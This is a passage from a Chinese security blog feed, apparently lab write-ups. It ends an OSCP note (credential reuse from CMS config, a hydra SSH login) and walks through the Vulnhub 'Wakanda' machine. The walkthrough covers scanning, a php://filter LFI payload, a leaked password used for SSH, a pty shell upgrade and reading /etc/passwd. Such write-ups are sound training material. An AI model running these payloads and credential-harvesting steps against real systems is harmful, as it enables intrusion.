-antup</span><br></pre></td></tr></tbody></table></figure><p>发现内部环回接口绑定了3306，mysql默认端口。密码复用考虑mysql密码，由于网站使用BigtreeCMS搭建，CMS源码中指定<code>./core/config.environment.php</code> 和<code>./core/config.settings.php</code>作为配置文件路径，其中有数据库用户名密码配置。</p><figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看webroot目录</span></span><br><span class="line"><span class="keyword">grep</span> -Ri DocumentRoot</span><br></pre></td></tr></tbody></table></figure><p>在目录内文件中查找相关字段</p><figure class="highlight tex"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -R '<span class="formula">$bigtree<span class="tag">\<span class="name">[</span></span>"config"<span class="tag">\<span class="name">]</span></span><span class="tag">\<span class="name">[</span></span>"db"<span class="tag">\<span class="name">]</span></span>'</span></span><br></pre></td></tr></tbody></table></figure><p>发现mysql用户名和密码配置root/zaq1xsw2cde3，使用mysql连接验证是否可用</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -pzaq1xsw2cde3 -e '<span class="keyword">show</span> <span class="keyword">databases</span>;'</span><br></pre></td></tr></tbody></table></figure><p>searchsploit可以搜索相关漏洞</p><figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">searchsploit ossec</span></span><br></pre></td></tr></tbody></table></figure><p>查看ssh配置</p><figure class="highlight gradle"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grep</span> -v <span class="string">'^#'</span> <span class="regexp">/etc/</span>ssh<span class="regexp">/sshd_config | uniq</span></span><br></pre></td></tr></tbody></table></figure><p>可以使用hydra来尝试爆破gibson的ssh密码</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -l gibson -p zaq1xsw2cde3 10.11.1.71 ssh                                                    </span></span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please <span class="keyword">do</span> <span class="keyword">not</span> <span class="keyword">use</span> <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes.                                                                                        </span><br><span class="line">[<span class="keyword">DATA</span>] <span class="keyword">max</span> <span class="number">1</span> task per <span class="number">1</span> <span class="keyword">server</span>, overall <span class="number">1</span> task, <span class="number">1</span> login try (l:<span class="number">1</span>/p:<span class="number">1</span>), ~<span class="number">1</span> try per task                         </span><br><span class="line">[<span class="keyword">DATA</span>] attacking ssh://<span class="number">10.11</span><span class="number">.1</span><span class="number">.71</span>:<span class="number">22</span>/                                                                          </span><br><span class="line">[<span class="number">22</span>][ssh] host: <span class="number">10.11</span><span class="number">.1</span><span class="number">.71</span>   login: gibson   <span class="keyword">password</span>: zaq1xsw2cde3</span><br><span class="line"><span class="number">1</span> <span class="keyword">of</span> <span class="number">1</span> target successfully completed, <span class="number">1</span> valid <span class="keyword">password</span> <span class="keyword">found</span></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished <span class="keyword">at</span> <span class="number">2021</span><span class="number">-01</span><span class="number">-18</span> <span class="number">11</span>:<span class="number">21</span>:<span class="number">40</span></span><br></pre></td></tr></tbody></table></figure><p>使用gibson账户ssh到目标靶机，gibson为sudo组用户，可以直接sudo su进行提权。<br>另外，靶机上的ossec存在漏洞也可以利用。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-基础命令&quot;&gt;&lt;a href=&quot;#0x00-基础命令&quot; class=&quot;headerlink&quot; title=&quot;0x00 基础命令&quot;&gt;&lt;/a&gt;0x00 基础命令&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mkdir -p &lt;span class=&quot;built_in&quot;&gt;test&lt;/span&gt;/{recon,exploit,report}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;man&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;apropos&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;which&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;locate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;find&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;0x01-基础服务&quot;&gt;&lt;a href=&quot;#0x01-基础服务&quot; class=&quot;headerlink&quot; title=&quot;0x01 基础服务&quot;&gt;&lt;/a&gt;0x01 基础服务&lt;/h2&gt;&lt;p&gt;1、SSH&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo systemctl start ssh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo ss -antlp |grep sshd&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo systemctl &lt;span class=&quot;built_in&quot;&gt;enable&lt;/span&gt; ssh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="OSCP" scheme="http://yoursite.com/categories/OSCP/"/>
    
    
      <category term="OSCP" scheme="http://yoursite.com/tags/OSCP/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub靶机渗透——Wakanda</title>
    <link href="http://yoursite.com/2020/06/17/Vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Wakanda/"/>
    <id>http://yoursite.com/2020/06/17/Vulnhub靶机渗透——Wakanda/</id>
    <published>2020-06-16T16:26:44.916Z</published>
    <updated>2020-06-27T15:18:47.261Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>靶机地址：<a href="https://www.vulnhub.com/entry/wakanda-1,251/#" target="_blank" rel="noopener">https://www.vulnhub.com/entry/wakanda-1,251/#</a></p><p>使用VM VirtualBox运行靶机，配置运行kali的VMware和运行靶机的VM VirtualBox均使用桥接网卡模式，这样kali和目的靶机就在同一个局域网中，可以开始后续的测试了。</p><h2 id="0x01-目标探测"><a href="#0x01-目标探测" class="headerlink" title="0x01 目标探测"></a>0x01 目标探测</h2><p>我们先使用<code>ipconfig</code>命令来查看下本地ip，然后再使用<code>netdiscover</code>命令和<code>arp -l</code>命令来探测局域网内有哪些存活的主机。</p><a id="more"></a><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ifconfig</span></span><br><span class="line">eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500</span><br><span class="line">        inet 192.168.199.211  netmask 255.255.255.0  broadcast 192.168.199.255</span><br><span class="line">        inet6 fe80::20c:29ff:fef9:c363  prefixlen 64  scopeid 0x20<link></span><br><span class="line">        ether 00:0c:29:f9:c3:63  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 570  bytes 187830 (183.4 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 73307  bytes 4399916 (4.1 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line">......</span><br></pre></td></tr></tbody></table></figure><p>kali在eth0上的IP地址和掩码为<code>192.168.199.211/24</code>。<code>netdiscover</code>和<code>arp -l</code>结果如下：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># netdiscover -i eth0</span></span><br><span class="line">Currently scanning: 172.16.28.0/16   |   Screen View: Unique Hosts       </span><br><span class="line">                                                                          </span><br><span class="line"> 18 Captured ARP Req/Rep packets, from 11 hosts.   Total size: 1080       </span><br><span class="line"> _____________________________________________________________________________</span><br><span class="line">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 192.168.199.1   d4:ee:07:60:2d:18      5     300  HIWIFI Co., Ltd.       </span><br><span class="line"> 192.168.199.122 04:cf:8c:24:ec:b2      3     180  XIAOMI Electronics,CO.,</span><br><span class="line"> 192.168.199.248 08:1f:71:30:18:db      1      60  TP-LINK TECHNOLOGIES CO</span><br><span class="line"> 192.168.199.105 08:00:27:3c:1e:db      2     120  PCS Systemtechnik GmbH </span><br><span class="line"> 192.168.199.123 44:23:7c:7b:79:bf      1      60  Beijing Xiaomi Mobile S</span><br><span class="line"> 192.168.199.151 00:02:ee:90:5c:3d      1      60  Nokia Danmark A/S      </span><br><span class="line"> 192.168.199.167 50:ec:50:39:89:bd      1      60  Beijing Xiaomi Mobile S</span><br><span class="line"> 192.168.199.183 44:23:7c:6d:18:07      1      60  Beijing Xiaomi Mobile S</span><br><span class="line"> 192.168.199.201 44:23:7c:84:61:e9      1      60  Beijing Xiaomi Mobile S</span><br><span class="line"> 192.168.199.188 cc:66:0a:2f:ec:be      1      60  Apple, Inc.            </span><br><span class="line"> 192.168.199.247 a4:cf:12:c6:bd:d3      1      60  Espressif Inc.</span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># arp-scan -l</span></span><br><span class="line">Interface: eth0, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:f9:c3:63, IPv4: 192.168.199.211</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.199.1   d4:ee:07:60:2d:18       HIWIFI Co., Ltd.</span><br><span class="line">192.168.199.105 08:00:27:3c:1e:db       PCS Systemtechnik GmbH</span><br><span class="line">192.168.199.105 08:00:27:3c:1e:db       PCS Systemtechnik GmbH (DUP: 2)</span><br><span class="line">192.168.199.122 04:cf:8c:24:ec:b2       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.199.123 44:23:7c:7b:79:bf       Beijing Xiaomi Mobile Software Co., Ltd</span><br><span class="line">192.168.199.151 00:02:ee:90:5c:3d       Nokia Danmark A/S</span><br><span class="line">192.168.199.167 50:ec:50:39:89:bd       Beijing Xiaomi Mobile Software Co., Ltd</span><br><span class="line">192.168.199.201 44:23:7c:84:61:e9       Beijing Xiaomi Mobile Software Co., Ltd</span><br><span class="line">192.168.199.188 cc:66:0a:2f:ec:be       Apple, Inc.</span><br><span class="line">192.168.199.247 a4:cf:12:c6:bd:d3       Espressif Inc.</span><br><span class="line">192.168.199.101 12:31:0a:85:a6:09       (Unknown: locally administered)</span><br><span class="line"></span><br><span class="line">11 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned <span class="keyword">in</span> 2.323 seconds (110.20 hosts/sec). 11 responded</span><br></pre></td></tr></tbody></table></figure><p>可以看到，除了<code>192.168.199.105 08:00:27:3c:1e:db       PCS Systemtechnik GmbH</code>这个ip之外，其他应该都是正常使用的ip，<code>192.168.199.105</code>应该就是我们这次靶机的ip。</p><h2 id="0x02-端口-服务扫描"><a href="#0x02-端口-服务扫描" class="headerlink" title="0x02 端口/服务扫描"></a>0x02 端口/服务扫描</h2><p>先使用nmap扫描靶机开放端口，结果如下：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -sV 192.168.199.105</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-17 10:15 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.199.105</span><br><span class="line">Host is up (0.00050s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">3333/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class="line">34509/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br><span class="line">MAC Address: 08:00:27:3C:1E:DB (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 14.58 seconds</span><br></pre></td></tr></tbody></table></figure><p>比较明显的是开放了80的web端口和3333的ssh端口，另外还有34509端口比较可疑。网页打开看了一下，是一个振金市场的主页。</p><p><a href="https://sbimg.cn/image/0Wl9K" target="_blank" rel="noopener"><img src="https://wx1.sbimg.cn/2020/06/17/image-20200617004853075.png" alt="image-20200617004853075.png"></a></p><p>使用nikto扫描下网站，看网站是否存在漏洞或者信息泄露：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nikto -h http://192.168.199.105</span></span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.199.105</span><br><span class="line">+ Target Hostname:    192.168.199.105</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2020-06-16 12:51:18 (GMT-4)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.10 (Debian)</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span></span><br><span class="line">+ No CGI Directories found (use <span class="string">'-C all'</span> to force check all possible <span class="built_in">dirs</span>)</span><br><span class="line">+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL <span class="keyword">for</span> the 2.x branch.</span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause <span class="literal">false</span> positives.</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ 7915 requests: 0 error(s) and 6 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-06-16 12:52:17 (GMT-4) (59 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></tbody></table></figure><p>但是没发现什么有用的信息，于是接着用dirb来暴力枚举下网站目录：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.199.105                                             </span></span><br><span class="line">-----------------                                                                   </span><br><span class="line">DIRB v2.22                                                                           </span><br><span class="line">By The Dark Raver                                                                   </span><br><span class="line">-----------------                                                                   </span><br><span class="line">START_TIME: Tue Jun 16 12:49:43 2020                                                 </span><br><span class="line">URL_BASE: http://192.168.199.105/                                                   </span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">-----------------</span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line">---- Scanning URL: http://192.168.199.105/ ----</span><br><span class="line">+ http://192.168.199.105/admin (CODE:200|SIZE:0)                                     </span><br><span class="line">+ http://192.168.199.105/backup (CODE:200|SIZE:0)                                   </span><br><span class="line">+ http://192.168.199.105/index.php (CODE:200|SIZE:1527)                             </span><br><span class="line">+ http://192.168.199.105/secret (CODE:200|SIZE:0)                                   </span><br><span class="line">+ http://192.168.199.105/server-status (CODE:403|SIZE:303)                           </span><br><span class="line">+ http://192.168.199.105/shell (CODE:200|SIZE:0)                                      </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Tue Jun 16 12:49:47 2020</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 6</span><br></pre></td></tr></tbody></table></figure><p>挨个访问了下，似乎没什么有用的东西。不过查看网页源码的过程中，发现一条有趣的注释：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag"><<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link active"</span> <span class="attr">href</span>=<span class="string">"?lang=fr"</span>></span>Fr/a></span><br></pre></td></tr></tbody></table></figure><p><code>lang</code>代表可以切换的语言，尝试直接在url中包含<code>lang</code>参数<code>？lang=fr</code>，发现页面中间的部分语言切换成了法语。这里可能存在本地文件包含(LFI)和远程文件包含(RFI)漏洞。</p><h2 id="0x03-LFI获取源码"><a href="#0x03-LFI获取源码" class="headerlink" title="0x03 LFI获取源码"></a>0x03 LFI获取源码</h2><p>考虑到可能存在LFI或者RFI漏洞，因为除了<code>index.php</code>其他的页面似乎没有什么可以突破的点，尝试用php伪协议读取下<code>index.php</code>的源码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.199.105/?lang=php://filter/convert.base64-encode/resource=index</span><br></pre></td></tr></tbody></table></figure><p>这里我们获取到的是base64之后的页面源码，解密后在开头部分发现一部分php源码，包含了一个密码：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><?php</span></span><br><span class="line">$password =<span class="string">"Niamey4Ever227!!!"</span> ;<span class="comment">//I have to remember it</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'lang'</span>]))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'lang'</span>].<span class="string">".php"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="meta">?></span></span><br></pre></td></tr></tbody></table></figure><p>另外原始网页源码中还包含了一部分明文，标明了作者是<code>mamadou</code>：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Vibranium Market</span><br><span class="line">Home</span><br><span class="line">Coming soon</span><br><span class="line"></span><br><span class="line">Made by@mamadou</span><br></pre></td></tr></tbody></table></figure><p>联想到之前nmap扫描到的ssh服务，尝试用这个用户名<code>mamadou</code>和密码<code>Niamey4Ever227!!!</code>登录下：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh mamadou@192.168.199.105 -p 3333</span></span><br><span class="line">mamadou@192.168.199.105<span class="string">'s password: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">Last login: Sat Feb 29 14:22:02 2020 from kali.lan</span></span><br><span class="line"><span class="string">Python 2.7.9 (default, Jun 29 2016, 13:08:31) </span></span><br><span class="line"><span class="string">[GCC 4.9.2] on linux2</span></span><br><span class="line"><span class="string">Type "help", "copyright", "credits" or "license" for more information.</span></span><br><span class="line"><span class="string">>>></span></span><br></pre></td></tr></tbody></table></figure><h2 id="0x04-切换Bash"><a href="#0x04-切换Bash" class="headerlink" title="0x04 切换Bash"></a>0x04 切换Bash</h2><p>ssh连过去之后是一个python的shell，不是太方便操作。先用python切换到<code>/bin/bash</code>，切换之后是<code>mamadou</code>的用户。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">>>> import pty</span><br><span class="line">>>> pty.spawn(<span class="string">"/bin/bash"</span>)</span><br><span class="line">mamadou@Wakanda1:~$</span><br></pre></td></tr></tbody></table></figure><p>先直接使用<code>find</code>命令全局搜索一下<code>flag</code>哈哈哈，注意这里如果我们直接搜索的话会出现一大堆没有权限的返回结果，可以使用<code>2>/dev/null</code>来丢弃掉所有的错误输出。<code>/dev/null</code>是Linux一个特殊的设备文件，这个文件接收到的任何数据都会被丢弃，通常也被成为位桶(bit bucket)。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:~$ find / -name <span class="string">"flag*"</span> 2>/dev/null</span><br><span class="line">/sys/devices/pci0000:00/0000:00:03.0/net/eth0/flags</span><br><span class="line">/sys/devices/virtual/net/lo/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS0/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS1/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS2/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS3/flags</span><br><span class="line">/home/devops/flag2.txt</span><br><span class="line">/home/mamadou/flag1.txt</span><br></pre></td></tr></tbody></table></figure><p>发现了<code>mamadou</code>和<code>devops</code>两个目录下的flag文件，<code>mamadou</code>目录下的<code>flag1.txt</code>可以直接访问，<code>devops</code>则没有权限访问。现在我们拿到第一个flag了~</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:~$ cat /home/mamadou/flag1.txt </span><br><span class="line">Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc</span><br><span class="line">mamadou@Wakanda1:~$ cat /home/devops/flag2.txt </span><br><span class="line">cat: /home/devops/flag2.txt: Permission denied</span><br></pre></td></tr></tbody></table></figure><p><code>mamadou</code>用户不出意外看起来没办法直接sudo，只能找找有没有什么其他曲线救国的方法。</p><h2 id="0x05-利用Devops用户权限-amp-amp-反向连接"><a href="#0x05-利用Devops用户权限-amp-amp-反向连接" class="headerlink" title="0x05 利用Devops用户权限&&反向连接"></a>0x05 利用Devops用户权限&&反向连接</h2><p>先使用<code>cat /etc/passwd</code>查看下靶机上的用户及权限：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:/var/mail$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span 